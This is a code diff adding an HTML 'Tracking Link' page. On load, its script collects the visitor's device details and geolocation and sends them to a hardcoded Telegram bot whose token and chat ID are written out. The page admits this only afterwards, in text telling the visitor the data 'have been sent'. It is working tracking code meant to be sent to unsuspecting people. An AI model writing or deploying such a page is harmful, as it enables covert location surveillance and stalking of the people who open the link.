@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tracking Link</title>
+  <script>
+    // Get device info and location
+    function getDeviceInfo() {
+      const deviceInfo = {
+        platform: navigator.platform,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+      };
+
+      // Get location info
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((position) => {
+          const locationInfo = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+          };
+          sendDataToTelegram(deviceInfo, locationInfo);
+        }, (error) => {
+          console.error("Geolocation error: " + error.message);
+        });
+      } else {
+        alert("Geolocation is not supported by this browser.");
+      }
+    }
+
+    // Send the data to Telegram bot
+    function sendDataToTelegram(deviceInfo, locationInfo) {
+      const botToken = '8095541814:AAH7ArNQ8dCG-cZqy63ERrqfMszqY5ZdT0Y';  // Your bot token
+      const chatId = '737878275';  // Your chat ID
+      const message = `
+        Device Info:
+        - Platform: ${deviceInfo.platform}
+        - User Agent: ${deviceInfo.userAgent}
+        - Language: ${deviceInfo.language}
+        
+        Location Info:
+        - Latitude: ${locationInfo.latitude}
+        - Longitude: ${locationInfo.longitude}
+      `;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          console.log('Message sent successfully:', data);
+        })
+        .catch(error => console.error('Error sending message:', error));
+    }
+
+    // Start tracking when the page is loaded
+    window.onload = getDeviceInfo;
+  </script>
+</head>
+<body>
+  <h1>Welcome to the Tracking Page</h1>
+  <p>If you are reading this, your device information and location have been sent!</p>
+</body>
+</html>
